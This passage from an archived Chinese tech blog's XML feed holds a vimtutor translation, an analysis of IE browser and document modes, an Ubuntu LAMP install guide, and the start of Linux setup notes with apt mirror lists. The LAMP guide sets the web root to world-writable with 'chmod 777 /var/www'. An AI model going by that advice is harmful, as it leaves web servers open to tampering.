键确保您处于正常模式。 2. 请将光标移动到本节中下面标记有 —&gt; 的那一行。 3. 请将光标移动到该行的尾部(也就是在第一个点号”.”后面)。 4. 然后输入 d$ 从光标处删至当前行尾部。—&gt; Somebody typed the end of this line twice. end of this line twice. 5. 请继续学习第二讲第三节就知道是怎么回事了。 第三节∶关于命令和对象&nbsp;删除命令 d 的格式如下∶ [number] d object 或者 d [number] object 其意如下∶ number - 代表执行命令的次数(可选项，缺省设置为 1 )。 d - 代表删除。 object - 代表命令所要操作的对象(下面有相关介绍)。 一个简短的对象列表∶ w - 从当前光标当前位置直到单字/单词末尾，包括空格。 e - 从当前光标当前位置直到单字/单词末尾，但是 不 包括空格。 $ - 从当前光标当前位置直到当前行末。特别提示∶对于勇于探索者，请在正常模式下面仅按代表相应对象的键而不使用命令，则将看到光标的移动正如上面的对象列表所代表的一样。 第四节∶对象命令的特殊情况&nbsp; 输入 dd 可以删除整一个当前行。 鉴于整行删除的高频度，VIM 的设计者决定要简化整行删除，仅需要在同一行上 击打两次 d 就可以删除掉光标所在的整行了。 1. 请将光标移动到本节中下面的短句段落中的第二行。 2. 输入 dd 删除该行。 3. 然后移动到第四行。 4. 接着输入 2dd (还记得前面讲过的 number-command-object 吗？) 删除两行。 1) Roses are red, 2) Mud is fun, 3) Violets are blue, 4) I have a car, 5) Clocks tell time, 6) Sugar is sweet 7) And so are you.第五节∶撤消类命令&nbsp; 输入 u 来撤消最后执行的命令，输入 U 来修正整行。 1. 请将光标移动到本节中下面标记有 —&gt; 的那一行，并将其置于第一个错误 处。 2. 输入 x 删除第一个不想保留的字母。 3. 然后输入 u 撤消最后执行的(一次)命令。 4. 这次要使用 x 修正本行的所有错误。 5. 现在输入一个大写的 U ，恢复到该行的原始状态。 6. 接着多次输入 u 以撤消 U 以及更前的命令。 7. 然后多次输入 CTRL-R (先按下 CTRL 键不放开，接着输入 R 键) ，这样就 可以执行恢复命令，也就是撤消掉撤消命令。—&gt; Fiix the errors oon thhis line and reeplace them witth undo. 8. 这些都是非常有用的命令。下面是第二讲的小结了。 第二讲小结&nbsp;1. 欲从当前光标删除至单字/单词末尾，请输入∶dw 2. 欲从当前光标删除至当前行末尾，请输入∶d$ 3. 欲删除整行，请输入∶dd 4. 在正常模式下一个命令的格式是∶ [number] command object 或者 command [number] object 其意是∶ number - 代表的是命令执行的次数 command - 代表要做的事情，比如 d 代表删除 object - 代表要操作的对象，比如 w 代表单字/单词，$ 代表到行末等等。 $ (to the end of line), etc. 5. 欲撤消以前的操作，请输入∶u (小写的u) 欲撤消在一行中所做的改动，请输入∶U (大写的U) 欲撤消以前的撤消命令，恢复以前的操作结果，请输入∶CTRL-R&nbsp; 第三讲第一节∶置入类命令&nbsp; 输入 p 将最后一次删除的内容置入光标之后 1. 请将光标移动到本节中下面示范段落的首行。 2. 输入 dd 将该行删除，这样会将该行保存到vim的缓冲区中。 3. 接着将光标移动到准备置入的位置的上方。记住∶是上方哦。 4. 然后在正常模式下(&lt;ESC&gt;键进入)，输入 p 将该行粘贴置入。 5. 重复步骤2至步骤4，将所有的行依序放置到正确的位置上。 d) Can you learn too? b) Violets are blue, c) Intelligence is learned, a) Roses are red, 第二节∶替换类命令&nbsp; 输入 r 和一个字符替换光标所在位置的字符。 1. 请将光标移动到本节中下面标记有 —&gt; 的第一行。 2. 请移动光标到第一个错误的适当位置。 3. 接着输入 r ，这样就能将错误替换掉了。 4. 重复步骤2和步骤3，直到第一行已经修改完毕。—&gt; Whan this lime was tuoed in, someone presswd some wrojg keys!—&gt; When this line was typed in, someone pressed some wrong keys! 5. 然后我们继续学校第三讲第三节。特别提示∶切记您要在使用中学习，而不是在记忆中学习。 第三节∶更改类命令&nbsp; 要改变一个单字/单词的部分或者全部，请输入 cw 1. 请将光标移动到本节中下面标记有 —&gt; 的第一行。 2. 接着把光标放在单词 lubw 的字母 u 的位置那里。 3. 然后输入 cw 就可以修正该单词了(在本例这里是输入 ine 。) 4. 最后按 &lt;ESC&gt; 键，然后光标定位到下一个错误第一个准备更改的字母处。 5. 重复步骤3和步骤4，直到第一个句子完全雷同第二个句子。—&gt; This lubw has a few wptfd that mrrf changing usf the change command.—&gt; This line has a few words that need changing using the change command.提示∶请注意 cw 命令不仅仅是替换了一个单词，也让您进入文本插入状态了。 第四节∶使用c指令的其他更改类命令&nbsp; 更改类指令可以使用同删除类命令所使用的对象参数。 1. 更改类指令的工作方式跟删除类命令是一致的。操作格式是∶ [number] c object 或者 c [number] object 2. 对象参数也是一样的，比如 w 代表单字/单词，$代表行末等等。 3. 请将光标移动到本节中下面标记有 —&gt; 的第一行。 4. 接着将光标移动到第一个错误处。 5. 然后输入 c$ 使得该行剩下的部分更正得同第二行一样。最后按 &lt;ESC&gt; 键。—&gt; The end of this line needs some help to make it like the second.—&gt; The end of this line needs to be corrected using the c$ command. 第三讲小结&nbsp;1. 要重新置入已经删除的文本内容，请输入小写字母 p。该操作可以将已删除 的文本内容置于光标之后。如果最后一次删除的是一个整行，那么该行将置 于当前光标所在行的下一行。 2. 要替换光标所在位置的字符，请输入小写的 r 和要替换掉原位置字符的新字 符即可。 3. 更改类命令允许您改变指定的对象，从当前光标所在位置直到对象的末尾。 比如输入 cw 可以替换当前光标到单词的末尾的内容；输入 c$ 可以替换当 前光标到行末的内容。 4. 更改类命令的格式是∶ [number] c object 或者 c [number] object下面我们继续学习下一讲。 &nbsp;第四讲 第一节∶定位及文件状态&nbsp; 输入 CTRL-g 显示当前编辑文件中当前光标所在行位置以及文件状态信息。输入 SHIFT-G 则直接跳转到文件中的某一指定行。 提示∶切记要先通读本节内容，之后才可以执行以下步骤!!! 1. 按下 CTRL 键不放开然后按 g 键。然后就会看到页面最底部出现一个状态信 息行，显示的内容是当前编辑的文件名和文件的总行数。请记住步骤3的行号。 2. 按下 SHIFT-G 键可以使得当前光标直接跳转到文件最后一行。 3. 输入您曾停留的行号，然后按下 SHIFT-G。这样就可以返回到您第一次按下 CTRL-g 时所在的行好了。注意∶输入行号时，行号是不会在屏幕上显示出来 的。 4. 如果愿意，您可以继续执行步骤1至步骤三。 第二节∶搜索类命令&nbsp; 输入 / 以及尾随的字符串可以用以在当前文件中查找该字符串。 1. 在正常模式下输入 / 字符。您此时会注意到该字符和光标都会出现在屏幕底 部，这跟 : 命令是一样的。 2. 接着输入 errroor &lt;回车&gt;。那个errroor就是您要查找的字符串。 3. 要查找同上一次的字符串，只需要按 n 键。要向相反方向查找同上一次的字 符串，请输入 Shift-N 即可。 4. 如果您想逆向查找字符串，请使用 ? 代替 / 进行。—&gt; When the search reaches the end of the file it will continue at the start. “errroor” is not the way to spell error; errroor is an error. 提示∶如果查找已经到达文件末尾，查找会自动从文件头部继续查找。 第三节∶配对括号的查找&nbsp; 按 % 可以查找配对的括号 )、]、}。 1. 把光标放在本节下面标记有 –&gt; 那一行中的任何一个 (、[ 或 { 处。 2. 接着按 % 字符。 3. 此时光标的位置应当是在配对的括号处。 4. 再次按 % 就可以跳回配对的第一个括号处。—&gt; This ( is a test line with (‘s, [‘s ] and {‘s } in it. ))提示∶在程序调试时，这个功能用来查找不配对的括号是很有用的。 第四节∶修正错误的方法之一&nbsp; 输入 :s/old/new/g 可以替换 old 为 new。 1. 请将光标移动到本节中下面标记有 —&gt; 的那一行。 2. 输入 :s/thee/the &lt;回车&gt; 。请注意该命令只改变光标所在行的第一个匹配 串。 3. 输入 :s/thee/the/g 则是替换全行的匹配串。—&gt; the best time to see thee flowers is in thee spring. 4. 要替换两行之间出现的每个匹配串，请输入 :#,#s/old/new/g (#,#代表的是两行的行号)。输入 :%s/old/new/g 则是替换整个文件中的每个匹配串。 第四讲小结&nbsp;1. Ctrl-g 用于显示当前光标所在位置和文件状态信息。Shift-G 用于将光标跳 转至文件最后一行。先敲入一个行号然后按 Shift-G 则是将光标移动至该行 号代表的行。 2. 输入 / 然后紧随一个字符串是则是在当前所编辑的文档中向后查找该字符串。 输入问号 ? 然后紧随一个字符串是则是在当前所编辑的文档中向前查找该字 符串。完成一次查找之后按 n 键则是重复上一次的命令，可在同一方向上查 找下一个字符串所在；或者按 Shift-N 向相反方向查找下该字符串所在。 3. 如果光标当前位置是括号(、)、[、]、{、}，按 % 可以将光标移动到配对的 括号上。 4. 在一行内替换头一个字符串 old 为新的字符串 new，请输入 :s/old/new 在一行内替换所有的字符串 old 为新的字符串 new，请输入 :s/old/new/g 在两行内替换所有的字符串 old 为新的字符串 new，请输入 :#,#s/old/new/g 在文件内替换所有的字符串 old 为新的字符串 new，请输入 :%s/old/new/g 进行全文替换时询问用户确认每个替换需添加 c 选项，请输入 :%s/old/new/gc&nbsp;第五讲第一节∶在 VIM 内执行外部命令的方法&nbsp; 输入 :! 然后紧随著输入一个外部命令可以执行该外部命令。 1. 按下我们所熟悉的 : 命令设置光标到屏幕底部。这样就可以让您输入命令了。 2. 接着输入感叹号 ! 这个字符，这样就允许您执行外部的 shell 命令了。 3. 我们以 ls 命令为例。输入 !ls &lt;回车&gt; 。该命令就会列举出您当前目录的 内容，就如同您在命令行提示符下输入 ls 命令的结果一样。如果 !ls 没起 作用，您可以试试 :!dir 看看。—&gt; 提示∶ 所有的外部命令都可以以这种方式执行。—&gt; 提示∶ 所有的 : 命令都必须以 &lt;回车&gt; 告终。 第二节∶关于保存文件的更多信息&nbsp; 要将对文件的改动保存到文件中，请输入 :w FILENAME 。 1. 输入 :!dir 或者 :!ls 获知当前目录的内容。您应当已知道最后还得敲 &lt;回车&gt; 吧。 2. 选择一个尚未存在文件名，比如 TEST 。 3. 接着输入 :w TEST (此处 TEST 是您所选择的文件名。) 4. 该命令会以 TEST 为文件名保存整个文件 (VIM 教程)。为了确保正确保存， 请再次输入 :!dir 查看您的目录列表内容。—&gt; 请注意∶如果您退出 VIM 然后在以文件名 TEST 为参数进入，那么该文件内 容应该同您保存时的文件内容是完全一样的。 5. 现在您可以通过输入 :!rm TEST 来删除 TEST 文件了。 第三节∶一个具有选择性的保存命令&nbsp; 要保存文件的部分内容，请输入 :#,# w FILENAME 1. 再来执行一次 :!dir 或者 :!ls 获知当前目录的内容，然后选择一个合适的 不重名的文件名，比如 TEST 。 2. 接着将光标移动至本页的最顶端，然后按 CTRL-g 找到该行的行号。别忘了 行号哦。 3. 接着把光标移动至本页的最底端，再按一次 CTRL-g 。也别忘了这个行好哦。 4. 为了只保存文章的某个部分，请输入 :#,# w TEST 。这里的 #,# 就是上面 要求您记住的行号(顶端行号,底端行号)，而 TEST 就是选定的文件名。 5. 最后，用 :!dir 确认文件是否正确保存。但是这次先别删除掉。 第四节∶提取和合并文件&nbsp; 要向当前文件中插入另外的文件的内容，请输入 :r FILENAME 1. 请键入 :!dir 确认您前面创建的 TEST 文件还在。 2. 然后将光标移动至当前页面的顶端。特别提示∶ 执行步骤3之后您将看到第五讲第三节，请届时再往下移动回到这里来。 3. 接着通过 :r TEST 将前面创建的名为 TEST 的文件提取进来。特别提示∶您所提取进来的文件将从光标所在位置处开始置入。 4. 为了确认文件已经提取成功，移动光标回到原来的位置就可以注意有两份第 五讲第三节，一份是原本，另外一份是来自文件的副本。 第五讲小结&nbsp;1. :!command 用于执行一个外部命令 command。 请看一些实际例子∶ :!dir - 用于显示当前目录的内容。 :!rm FILENAME - 用于删除名为 FILENAME 的文件。 2. :w FILENAME 可将当前 VIM 中正在编辑的文件保存到名为 FILENAME 的文 件中。 3. :#,#w FILENAME 可将当前编辑文件第 # 行至第 # 行的内容保存到文件 FILENAME 中。 4. :r FILENAME 可提取磁盘文件 FILENAME 并将其插入到当前文件的光标位置 后面。 &nbsp; 第六讲 第一节∶打开类命令&nbsp; 输入 o 将在光标的下方打开新的一行并进入插入模式。 1. 请将光标移动到本节中下面标记有 —&gt; 的那一行。 2. 接着输入小写的 o 在光标 下方 打开新的一行并进入插入模式。 3. 然后复制标记有 —&gt; 的行并按 &lt;ESC&gt; 键退出插入模式而进入正常模式。—&gt; After typing o the cursor is placed on the open line in Insert mode. 4. 为了在光标 上方 打开新的一行，只需要输入大写的 O 而不是小写的 o 就可以了。请在下行测试一下吧。当光标处在在该行上时，按 Shift-O可以 在该行上方新开一行。Open up a line above this by typing Shift-O while the cursor is on this line. 第二节∶光标后插入类命令&nbsp; 输入 a 将可在光标之后插入文本。 1. 请在正常模式下通过输入 $ 将光标移动到本节中下面标记有 —&gt; 的第一行 的末尾。 2. 接着输入小写的 a 则可在光标之后插入文本了。大写的 A 则可以直接在行 末插入文本。提示∶输入大写 A 的操作方法可以在行末插入文本，避免了输入 i，光标定位到 最后一个字符，输入的文本，&lt;ESC&gt; 回复正常模式，箭头右键移动光标以及 x 删除当前光标所在位置字符等等诸多繁杂的操作。 3. 操作之后第一行就可以补充完整了。请注意光标后插入文本与插入模式是基 本完全一致的，只是文本插入的位置定位稍有不同罢了。—&gt; This line will allow you to practice—&gt; This line will allow you to practice appending text to the end of a line. 第三节∶另外一个置换类命令的版本&nbsp; 输入大写的 R 可连续替换多个字符。 1. 请将光标移动到本节中下面标记有 —&gt; 的第一行。 2. 移动光标到第一行中不同于标有 —&gt; 的第二行的第一个单词的开始，即单 词 last 处。 3. 然后输入大写的 R 开始把第一行中的不同于第二行的剩余字符逐一输入，就 可以全部替换掉原有的字符而使得第一行完全雷同第二行了。—&gt; To make the first line the same as the last on this page use the keys.—&gt; To make the first line the same as the second, type R and the new text. 4. 请注意∶如果您按 &lt;ESC&gt; 退出置换模式回复正常模式，尚未替换的文本将仍 然保持原状。 第四节∶设置类命令的选项&nbsp; 设置可使查找或者替换可忽略大小写的选项 1. 要查找单词 ignore 可在正常模式下输入 /ignore 。要重复查找该词，可以 重复按 n 键。 2. 然后设置 ic 选项(ic就是英文忽略大小写Ignore Case的首字母缩写词)，即 输入∶ :set ic 3. 现在可以通过键入 n 键再次查找单词 ignore。重复查找可以重复键入 n 键。 4. 然后设置 hlsearch 和 incsearch 这两个选项，输入以下内容∶ :set hls is 5. 现在可以再次输入查找命令，看看会有什么效果∶ /ignore 第六讲 小结&nbsp;1. 输入小写的 o 可以在光标下方打开新的一行并将光标置于新开的行首，进入 插入模式。 输入大写的 O 可以在光标上方打开新的一行并将光标置于新开的行首，进入 插入模式。 2. 输入小写的 a 可以在光标所在位置之后插入文本。 输入大写的 A 可以在光标所在行的行末之后插入文本。 3. 输入大写的 R 将进入替换模式，直至按 &lt;ESC&gt; 键退出替换模式而进入正常 模式。 4. 输入 :set xxx 可以设置 xxx 选项。 &nbsp;第七讲∶在线帮助命令 使用在线帮助系统 Vim 拥有一个细致全面的在线帮助系统。要启动该帮助系统，请选择如下三种方 法之一∶ - 按下 &lt;HELP&gt; 键 (如果键盘上有的话) - 按下 &lt;F1&gt; 键 (如果键盘上有的话) - 输入 :help &lt;回车&gt; 输入 :q &lt;回车&gt; 可以关闭帮助窗口。 提供一个正确的参数给”:help”命令，您可以找到关于该主题的帮助。请试验以 下参数(可别忘了按回车键哦。:)∶ :help w &lt;回车&gt; :help c_&lt;T &lt;回车&gt; :help insert-index &lt;回车&gt; :help user-manual &lt;回车&gt; &nbsp;第八讲∶创建一个启动脚本 启用vim的功能 Vim的功能特性要比vi多得多，但大部分功能都没有缺省激活。为了启动更多的功能，您得创建一个vimrc文件。 1. 开始编辑vimrc文件，这取决于您所使用的操作系统∶ :edit ~/.vimrc 这是Unix系统所使用的命令 :edit $VIM/_vimrc 这是Windows系统所使用的命令 2. 接着导入vimrc范例文件∶ :read $VIMRUNTIME/vimrc_example.vim 3. 保存文件，命令为∶ :write 在下次您启动vim的时候，编辑器就会有了语法高亮的功能。您可以继续把您喜欢的其它功能设置添加到这个vimrc文件中。 结语 vim 教程到此结束。本教程只是为了简明地介绍一下vim编辑器，但已足以让您很容易学会使用本编辑器了。毋庸质疑，vim还有很多很多的命令，本教程所介绍的还差得远著呢。所以您要精通的话，还望继续努力哦。下一步您可以阅读 vim手册，使用的命令是∶ :help user-manual 为了更进一步的参考和学习，以下这本书值得推荐∶Vim - Vi Improved - 作者∶Steve Oualline出版社∶New Riders 这是第一本完全讲解vim的书籍。对于初学者特别有用。其中还包含有大量实例和图示。欲知详情，请访问 http://iccf-holland.org/click5.html 以下这本书比较老了而且内容主要是vi而不是vim，但是也值得推荐∶Learning the Vi Editor - 作者∶Linda Lamb出版社∶O’Reilly &lt; Associates Inc. 这是一本不错的书，通过它您几乎能够了解到全部vi能够做到的事情。此书的第 六个版本也包含了一些关于vim的信息。 GVIM中的教程，觉得不错，放到这里分享~ 我所做的工作就是将其格式化，让读者便于阅读 :)]]></content>
      <categories>
        <category>工具</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于浏览器模式和文本模式的困惑]]></title>
    <url>%2Fblog%2F2013%2F06%2F08%2F2013-06-08-cb-browser-mode-and-doccument-mode%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 什么是浏览器模式和文本模式？ 经常使用IE开发者工具的同学，肯定见过浏览器模式和文本模式，对于这两个名词，综合相关文档解释如下：浏览器模式（Browser Mode），用于切换IE针对该网页的默认文本模式、对不同版本浏览器的条件注释解析、决定请求头里userAgent的值。它在浏览器发出请求之前就已经确定，网站没有办法修改这个值。它代表的是用户以何种浏览器访问网站。IE9支持下列浏览器模式：&nbsp;userAgent默认文本模式IE7MSIE 7.0IE7标准IE8MSIE 8.0 &amp;&amp; Trident/4.0IE8标准IE9MSIE 9.0 &amp;&amp; Trident/5.0IE9标准IE9兼容性MSIE 7.0 &amp;&amp; Trident/5.0IE7标准（IE9兼容性模式与IE7模式的区别是：前者在UA里加上了Trident版本，后者和IE7完全一致无Trident标识；IE8中，IE9兼容性模式对应为IE8兼容性模式，UA里Trident版本为4.0，其他没变化。另，IE8中没有IE9模式）文本模式（Document Mode），其实就是经常说的文档模式。不同的文本模式对应不同的排版引擎，不同的JS引擎。上面提到，每一种浏览器模式对应一种默认的文本模式，网站还可以通过一些手段来更改文本模式，它代表的是浏览器以何种模式呈现页面。IE9有下列文本模式：&nbsp;documentModeIE7标准7IE8标准8IE9标准9怪异（Quirks）5（需要说明的是，IE8开始支持的渲染机制有：怪异模式（quirks mode）、完全标准模式（standards mode）和近似标准模式（almost standards mode），但开发者工具是无法选择近似标准模式的，实际上我们一般都选择触发完全标准模式）浏览器模式和文本模式有什么用？用来解决IE各版本带来的兼容性问题。根据微软描述的IE兼容性策略，在IE8+访问一个页面要经过这样的流程：一、首先，浏览器要确定浏览器模式。上面说过，浏览器模式是在请求发送之前就必须确定，默认取最新（IE9为IE9标准，IE8为IE8标准），有两种方式可以更改它：通过开发者工具选择（可选项见上表）；通过点击兼容性视图按钮；命中兼容性视图列表（微软维护的需要采用兼容性视图的列表。IE8+默认对这个列表和局域网的网址都会采用相应的兼容性模式）；二、浏览器通过请求头里userAgent的值，告诉服务器当前是何种浏览器模式；三、服务器可以通过下面方式改变浏览器文本模式：doctype；X-UA-Compatible Meta或对应的响应头；四、浏览器综合考虑开发者工具设置、第三步服务器返回的设置、兼容性列表设置等等情况，决定页面使用何种文本模式。这个过程有点复杂，放一张Qwrap群里灰大提供的流程图，可以自己点开看大图。（上图是IE9选取文本模式的流程图，这里还有IE8版本，有一些区别）问题终于来了！回顾下前面的介绍，浏览器模式决定：1）发送给服务端的UA；2）默认的文本模式；3）如何解析条件注释。它在请求发送前就已经确定，且不受服务端控制。文本模式决定：1）排版引擎；2）JS引擎。它在浏览器得到响应后最终确定，服务端可通过doctype或X-UA-Compatible来控制。测试一、根据前文，如果用户浏览器没有激活兼容性视图；没有开启IE开发者工具。那么IE9的浏览器模式默认为IE9，默认对应的文本模式应该是IE9标准（对于IE8来说，是类似的），我们通过下列代码将它改到IE7标准：&nbsp;1&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7&quot;&gt;下面，我们分别用原生IE8、IE9测试这个页面：&nbsp;请求头UAnavigator.userAgent条件注释documentModeJS引擎IE8MSIE 8.0 &amp;&amp; Trident/4.0MSIE 8.0 &amp;&amp; Trident/4.0IE77IE7IE9MSIE 9.0 &amp;&amp; Trident/5.0MSIE 7.0 &amp;&amp; Trident/5.0IE77IE7上表说明，浏览器发送请求时的浏览器模式符合预期（根据请求头UA），X-UA-Compatible确实会将浏览器文本模式改到了IE7标准（根据documentMode和JS引擎）。奇怪的是，文本模式的改变导致了浏览器模式的改变，因为条件注释是由浏览器模式决定的。本例中，文本模式改到IE7标准，条件注释也跟着变成IE7，意味着浏览器模式变到IE9/IE8兼容性（从IE9的测试来看，不能是IE7，因为UA里包含Trident）。至于IE8中JS取到的UA为什么没有变化，可能是bug或者理解不一致。测试二、那如果把测试地址加到兼容性列表呢？根据前文，这种情况浏览器模式应该是IE9/IE8兼容性，对应的文本模式依然是IE7标准。测试结果如下：&nbsp;请求头UAnavigator.userAgent条件注释documentModeJS引擎IE8MSIE 7.0 &amp;&amp; Trident/4.0MSIE 7.0 &amp;&amp; Trident/4.0IE77IE7IE9MSIE 7.0 &amp;&amp; Trident/5.0MSIE 7.0 &amp;&amp; Trident/5.0IE77IE7上表是完全符合预期的。测试三、如果把X-UA-Compatible改成IE=edge，继续使用兼容性模式测试呢？结论如下：&nbsp;请求头UAnavigator.userAgent条件注释documentModeJS引擎IE8MSIE 7.0 &amp;&amp; Trident/4.0MSIE 7.0 &amp;&amp; Trident/4.0IE88IE8IE9MSIE 7.0 &amp;&amp; Trident/5.0MSIE 9.0 &amp;&amp; Trident/5.0IE99IE9这个结论其实跟测试一是一致的：X-UA-Compatible为IE=edge，意味着文本模式会使用最新可用的版本，然而文本模式的更改，又把浏览器模式从IE9/IE8兼容性变成IE9/IE8。IE9会按照新的浏览器模式来设置JS的navigator.userAgent，IE8下JS的UA不变。测试四、那如果通过开发者工具人为设置浏览器模式和文本模式呢？经过测试，这样测试都是符合预期的。例如IE9下，设置浏览器模式为IE8，文本模式为IE7标准，请求头UA、JS的UA、条件注释都表明浏览器模式是IE8，documentMode和JS引擎都表明文本模式是IE7标准。因为，IE开发者工具的优先级最高，设置了这个，其他条件统统无视！结论IE8/9中X-UA-Compatible对文本模式的改变会导致浏览器模式的改变，也就是说服务端可以间接控制浏览器模式。这与微软文档里这一段描述有出入：An important detail to remember is that&nbsp;Browser Mode is chosen before IE requests web content. This means that&nbsp;sites cannot choose a Browser Mode.对于IE8，如果网站通过X-UA-Compatible meta/header更改文本模式为当前浏览器模式默认文本模式之外的值，那么页面将按照新的文本模式来呈现，条件注释也按照新的文本模式对应的浏览器模式来解析，但是JS获取的UA是浏览器模式初始状态。这样会导致用JS获取UA得到的浏览器版本，与实际渲染的浏览器版本不符，这会对基于UA的浏览器检测造成干扰。对于IE9，只有一点与IE8不同：JS获取到的是新文本模式对应的浏览器模式的UA。这会导致用JS获取UA得到的浏览器版本，与请求头发送给服务器UA里标识的浏览器版本不符，这可能对统计有影响。对于IE这种兼容性方案，几乎不可能做到理论上的完美。个人感觉还是IE9的策略影响面较小，更好一些。PS，上述结论都是我用Windows XP的原生IE8，Windows 7的原生IE9亲自测试得出来的。对于国内那些IE Shell们，实在过于奇葩，不在本文范围内。参考：Testing sites with Browser Mode vs. Doc ModeX-UA-Compatible header/meta tag is NOT the same as the Internet Explorer 8+ Compatibility View button原文链接：http://www.imququ.com/post/browser-mode-and-document-mode-in-ie.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu下安装Apache+PHP+Mysql]]></title>
    <url>%2Fblog%2F2013%2F06%2F08%2F2013-06-08-cb-apache-php-mysql%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 通过Apache我们可以学习php网络编程，可以用它来部署自己本地的wordpress博客，从而进一步通过网络和朋友交流。从此，你将深刻体会到网络带个我们的神奇力量，至少我是这样觉得的～～步骤一，安装apache2 1sudo apt-get install apache2 安装完成。&nbsp;运行如下命令重启下： 1sudo /etc/init.d/apache2 restart 在浏览器里输入http://localhost或者是http://127.0.0.1，如果看到了It works!，那就说明Apache就成功的安装了，Apache的默认安装，会在/var下建立一个名为www的目录，这个就是Web目录了，所有要能过浏览器访问的Web文件都要放到这个目录里。步骤二 ，安装php: 1sudo apt-get install libapache2-mod-php5 php5 此外，建议安装扩展php5-gd php5-mysql，安装方式同上.安装完后，我们要重新启动Apache，让它加载PHP模块： 1sudo /etc/init.d/apache2 restart 接下来，我们就在Web目录下面新建一个test.php文件来测试PHP是否能正常的运行，命令：1sudo gedit /var/www/test.php然后输入: 123&lt;?php echo&quot;hello,world!!&quot;;?&gt; &nbsp;接着保存文件,在浏览器里输入http://127.0.0.1/test.php，如果在网页中显示hello,world!!，那就说明PHP已经正常运行了。步骤三,安装mysql数据库: 1sudo apt-get install mysql-server mysql-client &nbsp;apt-get程序会自动下载安装最新的mysql版本。在安装的最后，它会要求里输入root的密码，注意，这里的root密码可不是Ubuntu的root密码啊，是你要给MySQL设定的root密码。步骤四,安装phpmyadmin-Mysql数据库管理 1sudo apt-get install phpmyadmin phpmyadmin设置：在安装过程中会要求选择Web server：apache2或lighttpd，使用空格键选定apache2，按tab键然后确定。然后会要求输入设置的Mysql数据库密码连接密码Password of the database”s administrative user。然后将phpmyadmin与apache2建立连接，以我的为例：www目录在/var/www，phpmyadmin在/usr/share /phpmyadmin目录，所以就用命令： 1sudo ln -s /usr/share/phpmyadmin /var/www 建立链接。phpmyadmin测试：在浏览器地址栏中打开http://localhost/phpmyadmin。以上ALMP的基本组件就安装完毕了，下面我们再来看一些其他的设置：步骤五，设置Ubuntu文件执行读写权限LAMP组建安装好之后，PHP网络服务器根目录默认设置是在：/var/www。由于Linux系统的安全性原则，改目录下的文件读写权限是只允许root用户操作的，所以我们不能在www文件夹中新建php文件，也不能修改和删除，必须要先修改/var/www目录的读写权限。在界面管理器中通过右键属性不能修改文件权限，得执行root终端命令： 1sudo chmod 777 /var/www 然后就可以写入html或php文件了。777是linux中的最高权限，表示可读，可写，可执行。转载自：http://www.comflag.com/2011/05/01/apache-web.htm]]></content>
      <categories>
        <category>后端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux学习笔记（上次更新时间2013/07/28）]]></title>
    <url>%2Fblog%2F2013%2F06%2F06%2F2013-06-06-cb-linux-learning%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 自从上次不小心把硬盘全部格式化之后，电脑里的几个系统，以及诸多配置都咔嚓了，没办法，又得从头来过。这个总结和记录了Linux学习过程中遇到的问题，以及电脑的配置等等，为下一次手贱做好准备。。。P.S: 本次系统更换为 unbuntu 13.04关于配置1. 源软件中心 -》 编辑 -》软件源 -》 我一般是选择，163的源，速度还不错，听说最近我们学校也弄了一个源（http://mirrors.hustunique.com），不知道写错没有，但是在系统中没有找到这个源，就将就着速度还不错的163源吧。改完之后，更新一下源： 1sudo apt-get upgrade 这个也不错（太长了，折叠）&nbsp; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111、首先备份Ubuntu 11.04源列表 sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup （备份下当前的源列表，有备无患嘛） 2、修改更新源 sudo gedit /etc/apt/sources.list （打开Ubuntu 11.04源列表文件） 3、将下面的代码粘贴进去（\#&quot;开头的那一行为注释，可以直接复制进文件中） #台湾源deb http://tw.archive.ubuntu.com/ubuntu/ natty main universe restricted multiverse deb-src http://tw.archive.ubuntu.com/ubuntu/ natty main universe restricted multiverse deb http://tw.archive.ubuntu.com/ubuntu/ natty-security universe main multiverse restricted deb-src http://tw.archive.ubuntu.com/ubuntu/ natty-security universe main multiverse restricted deb http://tw.archive.ubuntu.com/ubuntu/ natty-updates universe main multiverse restricted deb-src http://tw.archive.ubuntu.com/ubuntu/ natty-updates universe main multiverse restricted#网易 Ubuntu 11.04 源（速度很快）deb http://mirrors.163.com/ubuntu/ natty main universe restricted multiverse deb-src http://mirrors.163.com/ubuntu/ natty main universe restricted multiverse deb http://mirrors.163.com/ubuntu/ natty-security universe main multiverse restricted deb-src http://mirrors.163.com/ubuntu/ natty-security universe main multiverse restricted deb http://mirrors.163.com/ubuntu/ natty-updates universe main multiverse restricted deb http://mirrors.163.com/ubuntu/ natty-proposed universe main multiverse restricted deb-src http://mirrors.163.com/ubuntu/ natty-proposed universe main multiverse restricted deb http://mirrors.163.com/ubuntu/ natty-backports universe main multiverse restricted deb-src http://mirrors.163.com/ubuntu/ natty-backports universe main multiverse restricted deb-src http://mirrors.163.com/ubuntu/ natty-updates universe main multiverse restricted #骨头源，骨头源是bones7456架设的一个Ubuntu源 ，提供ubuntu,deepindeb http://ubuntu.srt.cn/ubuntu/ natty main universe restricted multiverse deb-src http://ubuntu.srt.cn/ubuntu/ natty main universe restricted multiverse deb http://ubuntu.srt.cn/ubuntu/ natty-security universe main multiverse restricted deb-src http://ubuntu.srt.cn/ubuntu/ natty-security universe main multiverse restricted deb http://ubuntu.srt.cn/ubuntu/ natty-updates universe main multiverse restricted deb http://ubuntu.srt.cn/ubuntu/ natty-proposed universe main multiverse restricted deb-src http://ubuntu.srt.cn/ubuntu/ natty-proposed universe main multiverse restricted deb http://ubuntu.srt.cn/ubuntu/ natty-backports universe main multiverse restricted deb-src http://ubuntu.srt.cn/ubuntu/ natty-backports universe main multiverse restricted deb-src http://ubuntu.srt.cn/ubuntu/ natty-updates universe main multiverse 